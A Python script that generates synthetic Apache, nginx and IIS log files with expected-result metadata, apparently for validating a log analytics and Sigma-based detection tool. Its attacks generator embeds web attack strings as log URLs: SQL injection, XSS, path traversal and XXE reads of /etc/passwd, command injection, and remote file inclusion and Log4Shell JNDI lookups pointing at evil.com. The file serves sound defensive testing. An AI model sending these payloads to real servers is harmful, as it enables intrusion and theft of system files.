import random
import datetime
import os
import json

# Output directories
BASE_DIR = "validation"
DATASETS_DIR = os.path.join(BASE_DIR, "datasets")
CATEGORIES = ["normal", "attacks", "reconnaissance", "performance", "errors", "malformed", "mixed"]

for cat in CATEGORIES:
    os.makedirs(os.path.join(DATASETS_DIR, cat), exist_ok=True)
os.makedirs(os.path.join(BASE_DIR, "expected_results"), exist_ok=True)

# Datasets sizes
SIZES = {
    "small": 50,
    "medium": 500,
    "large": 5000,
    "stress": 50000
}

IPS = ["192.168.1.100", "10.0.0.5", "172.16.0.10", "8.8.8.8", "1.1.1.1", "203.0.113.5", "198.51.100.2", "192.0.2.1"]
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
]
PATHS = ["/index.html", "/about.html", "/contact.php", "/login", "/dashboard", "/api/v1/users", "/images/logo.png", "/css/style.css", "/js/app.js"]

def get_random_timestamp(start_date=None, end_date=None):
    if start_date is None:
        start_date = datetime.datetime(2023, 1, 1)
    if end_date is None:
        end_date = datetime.datetime(2023, 12, 31)
    time_between_dates = end_date - start_date
    days_between_dates = time_between_dates.days
    random_number_of_days = random.randrange(days_between_dates)
    random_time = start_date + datetime.timedelta(
        days=random_number_of_days,
        hours=random.randint(0, 23),
        minutes=random.randint(0, 59),
        seconds=random.randint(0, 59)
    )
    return random_time

def format_apache_time(dt):
    return dt.strftime("%d/%b/%Y:%H:%M:%S -0700")

def format_nginx_time(dt):
    return dt.strftime("%d/%b/%Y:%H:%M:%S -0700")

def format_iis_time(dt):
    return dt.strftime("%Y-%m-%d %H:%M:%S").split(" ")

def format_apache_error_time(dt):
    return dt.strftime("%a %b %d %H:%M:%S %Y")

def format_nginx_error_time(dt):
    return dt.strftime("%Y/%m/%d %H:%M:%S")

def generate_apache_combined(dt, ip, method, url, status, bytes_sent, referer, user_agent, latency=None):
    time_str = format_apache_time(dt)
    if latency:
        return f'{ip} - - [{time_str}] "{method} {url} HTTP/1.1" {status} {bytes_sent} "{referer}" "{user_agent}" {latency}'
    return f'{ip} - - [{time_str}] "{method} {url} HTTP/1.1" {status} {bytes_sent} "{referer}" "{user_agent}"'

def generate_apache_common(dt, ip, method, url, status, bytes_sent):
    time_str = format_apache_time(dt)
    return f'{ip} - - [{time_str}] "{method} {url} HTTP/1.1" {status} {bytes_sent}'

def generate_nginx_access(dt, ip, method, url, status, bytes_sent, referer, user_agent, latency=None):
    time_str = format_nginx_time(dt)
    if latency:
        return f'{ip} - - [{time_str}] "{method} {url} HTTP/1.1" {status} {bytes_sent} "{referer}" "{user_agent}" {latency}'
    return f'{ip} - - [{time_str}] "{method} {url} HTTP/1.1" {status} {bytes_sent} "{referer}" "{user_agent}"'

def generate_iis_w3c(dt, ip, method, url, status, bytes_sent, referer, user_agent, latency=None):
    date_str, time_str = format_iis_time(dt)
    time_taken = latency if latency else random.randint(10, 500)
    query = "-"
    if "?" in url:
        url, query = url.split("?", 1)
    user_agent_iis = user_agent.replace(" ", "+") if user_agent != "-" else "-"
    referer_iis = referer if referer != "-" else "-"
    return f'{date_str} {time_str} 192.168.1.100 {method} {url} {query} 80 - {ip} {user_agent_iis} {referer_iis} {status} 0 0 {time_taken}'

def generate_apache_error(dt, ip, message, level="error"):
    time_str = format_apache_error_time(dt)
    return f'[{time_str}] [{level}] [client {ip}] {message}'

def generate_nginx_error(dt, ip, message, level="error"):
    time_str = format_nginx_error_time(dt)
    return f'{time_str} [{level}] 11#11: *1 {message}, client: {ip}, server: localhost, request: "GET / HTTP/1.1", host: "localhost"'

class TrackedMetrics:
    def __init__(self):
        self.visitors = set()
        self.bandwidth = 0
        self.sessions = set()

    def add(self, ip, bytes_sent, user_agent):
        self.visitors.add(ip)
        self.bandwidth += bytes_sent
        self.sessions.add(f"{ip}_{user_agent}")


def generate_normal_dataset(size, format_type):
    logs = []
    metrics = TrackedMetrics()
    if format_type == "iis":
        logs.append("#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken")

    current_time = get_random_timestamp()
    for _ in range(size):
        ip = random.choice(IPS)
        method = random.choices(["GET", "POST", "HEAD", "OPTIONS"], weights=[80, 15, 4, 1])[0]
        url = random.choice(PATHS)
        status = random.choices([200, 201, 301, 302, 304, 400, 401, 403, 404, 500], weights=[70, 5, 5, 5, 5, 2, 2, 2, 3, 1])[0]
        bytes_sent = random.randint(500, 50000)
        referer = "-" if random.random() > 0.5 else "http://example.com"
        user_agent = random.choice(USER_AGENTS)
        latency = random.randint(10, 2000)

        metrics.add(ip, bytes_sent, user_agent)

        if format_type == "apache_combined":
            logs.append(generate_apache_combined(current_time, ip, method, url, status, bytes_sent, referer, user_agent, latency=latency*1000))
        elif format_type == "apache_common":
             # common log doesn't have user agent explicitly recorded by this generator, but logically we tracked it
            logs.append(generate_apache_common(current_time, ip, method, url, status, bytes_sent))
        elif format_type == "nginx":
            logs.append(generate_nginx_access(current_time, ip, method, url, status, bytes_sent, referer, user_agent, latency=latency/1000.0))
        elif format_type == "iis":
            logs.append(generate_iis_w3c(current_time, ip, method, url, status, bytes_sent, referer, user_agent, latency=latency))

        current_time += datetime.timedelta(seconds=random.randint(1, 10))

    return logs, metrics

def generate_attacks_dataset(size, format_type):
    logs = []
    metrics = TrackedMetrics()
    if format_type == "iis":
        logs.append("#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken")

    current_time = get_random_timestamp()

    attack_payloads = [
        "/login.php?user=admin'+OR+'1'='1",
        "/index.php?id=1+UNION+SELECT+1,2,3--",
        "/search?q=1';+DROP+TABLE+users--",
        "/search?q=<script>alert(1)</script>",
        "/contact?name=John<img+src=x+onerror=alert(1)>",
        "/download.php?file=../../../../etc/passwd",
        "/index.php?page=..%2f..%2f..%2fetc%2fpasswd",
        "/image?path=C:\\Windows\\System32\\cmd.exe",
        "/index.php?page=http://evil.com/shell.txt",
        "/ping.php?ip=127.0.0.1;+cat+/etc/passwd",
        "/exec?cmd=whoami",
        "/xml?data=<!ENTITY+xxe+SYSTEM+\"file:///etc/passwd\">",
        "/template?name={{7*7}}",
        "/?q=${jndi:ldap://evil.com/a}"
    ]

    for _ in range(size):
        ip = "185.15.2.1"
        method = "GET"
        url = random.choice(attack_payloads)
        status = random.choices([200, 403, 404, 500], weights=[20, 50, 20, 10])[0]
        bytes_sent = random.randint(100, 1000)
        referer = "-"
        user_agent = "python-requests/2.25.1"
        latency = random.randint(10, 500)

        metrics.add(ip, bytes_sent, user_agent)

        if format_type == "apache_combined":
            logs.append(generate_apache_combined(current_time, ip, method, url, status, bytes_sent, referer, user_agent, latency=latency*1000))
        elif format_type == "nginx":
            logs.append(generate_nginx_access(current_time, ip, method, url, status, bytes_sent, referer, user_agent, latency=latency/1000.0))
        elif format_type == "iis":
            logs.append(generate_iis_w3c(current_time, ip, method, url, status, bytes_sent, referer, user_agent, latency=latency))

        current_time += datetime.timedelta(seconds=random.randint(1, 5))

    return logs, metrics

def generate_recon_dataset(size, format_type):
    logs = []
    metrics = TrackedMetrics()
    if format_type == "iis":
        logs.append("#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken")

    current_time = get_random_timestamp()

    scanners = [
        ("sqlmap/1.5.8#dev (http://sqlmap.org)", "/page?id=1"),
        ("Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)", "/"),
        ("Nikto", "/.git/config"),
        ("gobuster 3.1.0", "/admin/"),
        ("DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)", "/wp-admin/"),
        ("ffuf/1.3.1", "/test.php"),
        ("Wfuzz/2.4", "/api/"),
        ("Burp Suite Professional", "/login")
    ]

    for _ in range(size):
        ip = "114.114.114.114"
        method = random.choice(["GET", "POST", "HEAD"])
        ua, url = random.choice(scanners)
        status = random.choices([200, 401, 403, 404], weights=[5, 5, 10, 80])[0]
        bytes_sent = random.randint(100, 500)
        referer = "-"
        latency = random.randint(5, 50)

        metrics.add(ip, bytes_sent, ua)

        if format_type == "apache_combined":
            logs.append(generate_apache_combined(current_time, ip, method, url, status, bytes_sent, referer, ua, latency=latency*1000))
        elif format_type == "nginx":
            logs.append(generate_nginx_access(current_time, ip, method, url, status, bytes_sent, referer, ua, latency=latency/1000.0))
        elif format_type == "iis":
            logs.append(generate_iis_w3c(current_time, ip, method, url, status, bytes_sent, referer, ua, latency=latency))

        current_time += datetime.timedelta(milliseconds=random.randint(50, 500))

    return logs, metrics

def generate_performance_dataset(size, format_type):
    logs = []
    metrics = TrackedMetrics()
    if format_type == "iis":
        logs.append("#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken")

    current_time = get_random_timestamp()

    for _ in range(size):
        ip = random.choice(IPS)
        method = "GET"

        if random.random() < 0.1:
            url = "/api/v1/heavy-report"
            latency = random.randint(10000, 30000)
            bytes_sent = random.randint(50000, 100000)
        elif random.random() < 0.1:
            url = "/downloads/large-file.zip"
            latency = random.randint(1000, 5000)
            bytes_sent = random.randint(50000000, 500000000)
        else:
            url = random.choice(PATHS)
            latency = random.randint(10, 500)
            bytes_sent = random.randint(500, 5000)

        status = 200
        referer = "-"
        user_agent = random.choice(USER_AGENTS)

        metrics.add(ip, bytes_sent, user_agent)

        if format_type == "apache_combined":
            logs.append(generate_apache_combined(current_time, ip, method, url, status, bytes_sent, referer, user_agent, latency=latency*1000))
        elif format_type == "nginx":
            logs.append(generate_nginx_access(current_time, ip, method, url, status, bytes_sent, referer, user_agent, latency=latency/1000.0))
        elif format_type == "iis":
            logs.append(generate_iis_w3c(current_time, ip, method, url, status, bytes_sent, referer, user_agent, latency=latency))

        current_time += datetime.timedelta(milliseconds=random.randint(10, 100))

    return logs, metrics

def generate_errors_dataset(size, format_type):
    logs = []
    metrics = TrackedMetrics()
    current_time = get_random_timestamp()

    messages = [
        "File does not exist: /usr/local/apache/htdocs/favicon.ico",
        "client denied by server configuration: /usr/local/apache/htdocs/admin",
        "script '/var/www/html/wp-login.php' not found or unable to stat",
        "AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error.",
        "Connection reset by peer",
        "upstream timed out (110: Connection timed out) while reading response header from upstream",
        "directory index of \"/var/www/html/\" is forbidden"
    ]

    for _ in range(size):
        ip = random.choice(IPS)
        message = random.choice(messages)

        # Error logs don't directly record bytes or UA typically in these simple parsers
        metrics.add(ip, 0, "-")

        if format_type == "apache_error":
            logs.append(generate_apache_error(current_time, ip, message))
        elif format_type == "nginx_error":
            logs.append(generate_nginx_error(current_time, ip, message))

        current_time += datetime.timedelta(seconds=random.randint(1, 60))

    return logs, metrics

def generate_malformed_dataset(size, format_type):
    logs = []
    metrics = TrackedMetrics()
    current_time = get_random_timestamp()
    for i in range(size):
        if i % 5 == 0:
            logs.append("This is not a log line at all")
        elif i % 5 == 1:
            logs.append("192.168.1.1 - - [invalid time] \"GET / HTTP/1.1\" 200 100")
            metrics.add("192.168.1.1", 100, "-")
        elif i % 5 == 2:
            logs.append("192.168.1.1 - - [10/Oct/2000:13:55:36 -0700] \"GET / HTTP/1.1\" invalid_status 100")
            metrics.add("192.168.1.1", 100, "-")
        elif i % 5 == 3:
             logs.append("192.168.1.1 - - [10/Oct/2000:13:55:36 -0700] \"\" 200 100")
             metrics.add("192.168.1.1", 100, "-")
        else:
            logs.append(generate_apache_combined(current_time, "1.1.1.1", "GET", "/", 200, 100, "-", "-"))
            metrics.add("1.1.1.1", 100, "-")
        current_time += datetime.timedelta(seconds=1)
    return logs, metrics

def generate_mixed_dataset(size, format_type):
    logs = []
    metrics = TrackedMetrics()
    if format_type == "iis":
        logs.append("#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken")

    current_time = get_random_timestamp()

    for _ in range(size):
        rand = random.random()
        if rand < 0.7:
             # normal
            ip = random.choice(IPS)
            method = random.choices(["GET", "POST"], weights=[80, 20])[0]
            url = random.choice(PATHS)
            status = 200
            bytes_sent = random.randint(500, 50000)
            referer = "-"
            user_agent = random.choice(USER_AGENTS)
            latency = random.randint(10, 2000)
        elif rand < 0.8:
            # attack
            ip = "185.15.2.1"
            method = "GET"
            url = "/index.php?id=1+UNION+SELECT+1,2,3--"
            status = 200
            bytes_sent = random.randint(100, 1000)
            referer = "-"
            user_agent = "python-requests/2.25.1"
            latency = random.randint(10, 500)
        elif rand < 0.9:
            # recon
            ip = "114.114.114.114"
            method = "GET"
            url = "/.git/config"
            status = 404
            bytes_sent = random.randint(100, 500)
            referer = "-"
            user_agent = "Nikto"
            latency = random.randint(5, 50)
        elif rand < 0.95:
            # error
            ip = random.choice(IPS)
            method = "GET"
            url = "/missing_file.jpg"
            status = 404
            bytes_sent = 0
            referer = "-"
            user_agent = random.choice(USER_AGENTS)
            latency = random.randint(5, 50)
        else:
            # performance
            ip = random.choice(IPS)
            method = "GET"
            url = "/api/v1/heavy-report"
            status = 200
            bytes_sent = random.randint(50000, 100000)
            referer = "-"
            user_agent = random.choice(USER_AGENTS)
            latency = random.randint(10000, 30000)

        metrics.add(ip, bytes_sent, user_agent)

        if format_type == "apache_combined":
            logs.append(generate_apache_combined(current_time, ip, method, url, status, bytes_sent, referer, user_agent, latency=latency*1000))
        elif format_type == "nginx":
            logs.append(generate_nginx_access(current_time, ip, method, url, status, bytes_sent, referer, user_agent, latency=latency/1000.0))
        elif format_type == "iis":
            logs.append(generate_iis_w3c(current_time, ip, method, url, status, bytes_sent, referer, user_agent, latency=latency))

        current_time += datetime.timedelta(seconds=random.randint(1, 10))
    return logs, metrics


print("Generating datasets...")

expected_results = {}
total_generated_logs = 0

for cat in CATEGORIES:
    for size_name, size in SIZES.items():
        print(f"Generating {cat} - {size_name}...")

        if cat == "normal":
            formats = ["apache_combined", "apache_common", "nginx", "iis"]
            for fmt in formats:
                logs, metrics = generate_normal_dataset(size, fmt)
                filename = f"{fmt}_{size_name}.log"
                with open(os.path.join(DATASETS_DIR, cat, filename), "w") as f:
                    f.write("\n".join(logs))
                expected_results[f"{cat}/{filename}"] = {
                    "expected_parser": fmt if fmt != "apache_combined" else "apache_access",
                    "expected_analytics_provider": "goaccess",
                    "expected_request_count": size,
                    "expected_visitors": len(metrics.visitors),
                    "expected_sessions": len(metrics.sessions),
                    "expected_bandwidth": metrics.bandwidth,
                    "expected_sigma_detections": False,
                    "expected_native_detections": False,
                    "expected_diagnostics_behaviour": "success"
                }
                total_generated_logs += len(logs)

        elif cat == "attacks":
            formats = ["apache_combined", "nginx"]
            for fmt in formats:
                logs, metrics = generate_attacks_dataset(size, fmt)
                filename = f"{fmt}_{size_name}.log"
                with open(os.path.join(DATASETS_DIR, cat, filename), "w") as f:
                    f.write("\n".join(logs))
                expected_results[f"{cat}/{filename}"] = {
                    "expected_parser": fmt if fmt != "apache_combined" else "apache_access",
                    "expected_analytics_provider": "goaccess",
                    "expected_request_count": size,
                    "expected_visitors": len(metrics.visitors),
                    "expected_sessions": len(metrics.sessions),
                    "expected_bandwidth": metrics.bandwidth,
                    "expected_sigma_detections": True,
                    "expected_native_detections": True,
                    "expected_diagnostics_behaviour": "success"
                }
                total_generated_logs += len(logs)

        elif cat == "reconnaissance":
            formats = ["apache_combined"]
            for fmt in formats:
                logs, metrics = generate_recon_dataset(size, fmt)
                filename = f"{fmt}_{size_name}.log"
                with open(os.path.join(DATASETS_DIR, cat, filename), "w") as f:
                    f.write("\n".join(logs))
                expected_results[f"{cat}/{filename}"] = {
                    "expected_parser": "apache_access",
                    "expected_analytics_provider": "goaccess",
                    "expected_request_count": size,
                    "expected_visitors": len(metrics.visitors),
                    "expected_sessions": len(metrics.sessions),
                    "expected_bandwidth": metrics.bandwidth,
                    "expected_sigma_detections": True,
                    "expected_native_detections": True,
                    "expected_diagnostics_behaviour": "success"
                }
                total_generated_logs += len(logs)

        elif cat == "performance":
            formats = ["nginx"]
            for fmt in formats:
                logs, metrics = generate_performance_dataset(size, fmt)
                filename = f"{fmt}_{size_name}.log"
                with open(os.path.join(DATASETS_DIR, cat, filename), "w") as f:
                    f.write("\n".join(logs))
                expected_results[f"{cat}/{filename}"] = {
                    "expected_parser": "nginx",
                    "expected_analytics_provider": "goaccess",
                    "expected_request_count": size,
                    "expected_visitors": len(metrics.visitors),
                    "expected_sessions": len(metrics.sessions),
                    "expected_bandwidth": metrics.bandwidth,
                    "expected_sigma_detections": False,
                    "expected_native_detections": False,
                    "expected_diagnostics_behaviour": "success"
                }
                total_generated_logs += len(logs)

        elif cat == "errors":
            formats = ["apache_error", "nginx_error"]
            for fmt in formats:
                logs, metrics = generate_errors_dataset(size, fmt)
                filename = f"{fmt}_{size_name}.log"
                with open(os.path.join(DATASETS_DIR, cat, filename), "w") as f:
                    f.write("\n".join(logs))
                expected_results[f"{cat}/{filename}"] = {
                    "expected_parser": fmt,
                    "expected_analytics_provider": "duckdb", # GoAccess lacks some support for purely unstructured error logs without standard format string
                    "expected_request_count": size,
                    "expected_visitors": len(metrics.visitors),
                    "expected_sessions": len(metrics.sessions),
                    "expected_bandwidth": metrics.bandwidth,
                    "expected_sigma_detections": False,
                    "expected_native_detections": False,
                    "expected_diagnostics_behaviour": "success"
                }
                total_generated_logs += len(logs)

        elif cat == "malformed":
             formats = ["apache_combined"]
             for fmt in formats:
                logs, metrics = generate_malformed_dataset(size, fmt)
                filename = f"{fmt}_{size_name}.log"
                with open(os.path.join(DATASETS_DIR, cat, filename), "w") as f:
                    f.write("\n".join(logs))
                expected_results[f"{cat}/{filename}"] = {
                    "expected_parser": "apache_access",
                    "expected_analytics_provider": "goaccess",
                    "expected_request_count": size - (size // 5), # 1/5th are not even logs
                    "expected_visitors": len(metrics.visitors),
                    "expected_sessions": len(metrics.sessions),
                    "expected_bandwidth": metrics.bandwidth,
                    "expected_sigma_detections": False,
                    "expected_native_detections": False,
                    "expected_diagnostics_behaviour": "has_skipped_lines"
                }
                total_generated_logs += len(logs)

        elif cat == "mixed":
             formats = ["apache_combined"]
             for fmt in formats:
                logs, metrics = generate_mixed_dataset(size, fmt)
                filename = f"{fmt}_{size_name}.log"
                with open(os.path.join(DATASETS_DIR, cat, filename), "w") as f:
                    f.write("\n".join(logs))
                expected_results[f"{cat}/{filename}"] = {
                    "expected_parser": "apache_access",
                    "expected_analytics_provider": "goaccess",
                    "expected_request_count": size,
                    "expected_visitors": len(metrics.visitors),
                    "expected_sessions": len(metrics.sessions),
                    "expected_bandwidth": metrics.bandwidth,
                    "expected_sigma_detections": True,
                    "expected_native_detections": True,
                    "expected_diagnostics_behaviour": "success"
                }
                total_generated_logs += len(logs)

with open(os.path.join(BASE_DIR, "expected_results", "results.json"), "w") as f:
    json.dump(expected_results, f, indent=4)

print(f"Done! Total logs generated: {total_generated_logs}")
